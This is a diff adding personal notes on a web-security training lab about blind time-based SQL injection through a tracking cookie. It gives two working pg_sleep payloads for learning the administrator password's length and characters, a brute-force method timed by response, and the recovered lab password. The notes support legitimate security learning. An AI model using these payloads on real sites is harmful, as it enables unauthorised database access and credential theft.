@@ -1,0 +1,16 @@
+Lab #14
+
+Vulnerable parameter - tracking cookie
+
+End goals
+    - Output admin password
+    - login as administrator
+
+    How long is password (keep iterating the pw length)
+        ' || (SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users where username='administrator' and LENGTH(password)=1)--
+
+    What is Password
+     	' || (SELECT CASE WHEN (username='administrator' and substring(password,1,1) = 'a') THEN pg_sleep(5) ELSE pg_sleep(-1) END FROM users)--
+         Run via clusterbomb.  Sort by response time.  Important to set custom resources to only run 1 at a time.  Highlight any that are about 5sec
+         and then filter by highlighted
+         Password = xr1mflv6stj3rap9y7kp
